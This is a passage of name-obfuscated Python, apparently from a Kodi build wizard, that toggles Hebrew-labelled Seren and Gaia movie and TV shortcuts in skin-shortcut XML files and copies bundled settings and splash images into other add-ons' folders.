		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:549
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:552
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:553
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:557
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:558
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:559
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:577
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:580
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:581
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:585
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:586
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:587
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:605
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:608
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:609
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:612
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:613
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:614
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:632
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:635
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:636
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:638
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:639
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:640
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:658
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:661
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:662
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:664
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:665
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:666
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:684
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:687
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:688
    OOO0O00OOOO000OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:691
    with open (OOO0O00OOOO000OOO ,'r')as O00O0OO0O0OOO00OO :#line:692
      O0O0OOOOOOO000OOO =O00O0OO0O0OOO00OO .read ()#line:693
    O0O0OOOOOOO000OOO =O0O0OOOOOOO000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:711
    with open (OOO0O00OOOO000OOO ,'w')as O00O0OO0O0OOO00OO :#line:714
      O00O0OO0O0OOO00OO .write (O0O0OOOOOOO000OOO )#line:715
def rdbuildinstall ():#line:718
  try :#line:719
   OO00O0000OO0OO000 =(ADDON .getSetting ("rdbuild"))#line:720
   if OO00O0000OO0OO000 =='true':#line:721
     O00OO0OO000000O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:722
     O00OO0OOO0000O0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:723
     copyfile (O00OO0OO000000O0O ,O00OO0OOO0000O0O0 )#line:724
  except :#line:725
     pass #line:726
def rdbuildaddonoff ():#line:729
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:732
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:733
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:734
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:752
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:755
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:756
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:760
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:761
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:762
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:780
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:783
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:784
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:788
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:789
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:790
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:808
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:811
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:812
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:816
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:817
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:818
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:836
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:839
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:840
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:843
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:844
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:845
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:863
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:866
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:867
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:869
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:870
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:871
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:889
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:892
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:893
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:895
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:896
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:897
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:915
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:918
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:919
    OOOO00OO0OOOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:922
    with open (OOOO00OO0OOOO0000 ,'r')as O0000OOO00OO0OO00 :#line:923
      OOO0OOO00O000000O =O0000OOO00OO0OO00 .read ()#line:924
    OOO0OOO00O000000O =OOO0OOO00O000000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:942
    with open (OOOO00OO0OOOO0000 ,'w')as O0000OOO00OO0OO00 :#line:945
      O0000OOO00OO0OO00 .write (OOO0OOO00O000000O )#line:946
def rdbuildinstalloff ():#line:949
    try :#line:950
       OO00OO0OO00000OOO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:951
       O000O0000OOO0O0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:952
       copyfile (OO00OO0OO00000OOO ,O000O0000OOO0O0OO )#line:954
       OO00OO0OO00000OOO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:956
       O000O0000OOO0O0OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:957
       copyfile (OO00OO0OO00000OOO ,O000O0000OOO0O0OO )#line:959
       OO00OO0OO00000OOO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:961
       O000O0000OOO0O0OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:962
       copyfile (OO00OO0OO00000OOO ,O000O0000OOO0O0OO )#line:964
       OO00OO0OO00000OOO =ADDONPATH +"/resources/rdoff/Splash.png"#line:967
       O000O0000OOO0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:968
       copyfile (OO00OO0OO00000OOO ,O000O0000OOO0O0OO )#line:970
    except :#line:972
       pass #line:973
def rdbuildaddonON ():#line:980
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:982
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:983
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:984
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1002
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1005
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1006
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1010
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1011
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1012
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1030
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1033
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1034
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1038
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1039
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1040
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1058
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1061
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1062
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1066
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1067
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1068
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1086
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1089
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1090
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1093
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1094
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1095
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1113
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1116
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1117
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1119
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1120
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1121
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1139
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1142
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1143
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1145
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1146
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1147
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1165
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1168
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1169
    OO0O0OO000000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1172
    with open (OO0O0OO000000O0OO ,'r')as OOOOOOO00O0O00000 :#line:1173
      OOO0OOO0OO00O0OOO =OOOOOOO00O0O00000 .read ()#line:1174
    OOO0OOO0OO00O0OOO =OOO0OOO0OO00O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
